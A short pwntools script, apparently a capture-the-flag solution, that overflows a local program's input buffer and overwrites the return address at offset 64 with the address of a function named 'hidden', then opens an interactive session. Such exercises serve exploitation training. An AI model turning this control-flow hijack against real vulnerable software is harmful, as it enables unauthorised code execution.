```
from pwn import *
proc = process('binary')
elf = ELF('binary')
shell_loc = elf.symbols.hidden
payload = fit({
64: shell_loc
}
)
proc.sendline(payload)
proc.interactive()

```
